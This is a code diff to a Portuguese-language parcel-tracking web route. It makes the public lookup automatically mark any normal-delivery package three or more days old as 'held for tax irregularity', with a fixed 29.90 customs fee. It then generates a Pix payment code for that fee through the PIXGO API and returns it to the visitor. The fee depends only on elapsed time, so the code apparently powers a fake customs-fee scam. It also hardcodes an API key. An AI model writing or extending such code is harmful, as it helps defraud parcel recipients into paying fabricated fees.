@@ -177,9 +177,31 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
         if (packageData.tipo_entrega === 'NORMAL' && diffDays >= 3 && !packageData.taxa_paga) {
             const taxaStatus = '⚠️ Objeto retido - Aguardando regularização fiscal';
             if (!rows.some(r => r.status_atual === taxaStatus)) {
+
+                // --- Integração Automática PIXGO ---
+                let taxaPixEmv = null;
+                try {
+                    const pixRes = await require('axios').post('https://pixgo.org/api/v1/payment/create', {
+                        amount: 29.90,
+                        description: `Taxa da Alfândega - ${codigo}`
+                    }, {
+                        headers: {
+                            'x-api-key': 'pk_9073c62f8b397edc81e80d8675f6a6459916140064fbb2f3d653ba5b09dc9e3d',
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    if (pixRes.data && pixRes.data.success && pixRes.data.emv) {
+                        taxaPixEmv = pixRes.data.emv;
+                        console.log(`[PIXGO AUTO] Pix gerado com sucesso para ${codigo}`);
+                    }
+                } catch (pixErr) {
+                    console.error('[PIXGO AUTO ERROR]', pixErr.message);
+                }
+
                 await db.query(
-                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, tipo_entrega) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                    [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, 'NORMAL']
+                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
+                    [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL']
                 );
             }
         }
@@ -190,7 +212,9 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
         const lastStatus = currentRows[currentRows.length - 1];
         packageData = currentRows[0];
 
-        const taxaRow = currentRows.find(r => r.taxa_valor && r.taxa_valor !== '0' && r.taxa_valor !== '0.00') || lastStatus;
+        // Ensure we prioritize finding a row that actually contains the taxa_pix
+        const taxaRow = currentRows.find(r => r.taxa_valor && r.taxa_valor !== '0' && r.taxa_valor !== '0.00' && r.taxa_pix) ||
+            currentRows.find(r => r.taxa_valor && r.taxa_valor !== '0' && r.taxa_valor !== '0.00') || lastStatus;
 
         res.json({
             success: true,
@@ -203,7 +227,7 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
                 status_atual: r.status_atual
             })),
             taxa_valor: packageData.taxa_paga ? null : taxaRow.taxa_valor,
-            taxa_pix: taxaRow.taxa_pix,
+            taxa_pix: packageData.taxa_paga ? null : taxaRow.taxa_pix,
             tipo_entrega: packageData.tipo_entrega,
             taxa_paga: packageData.taxa_paga
         });
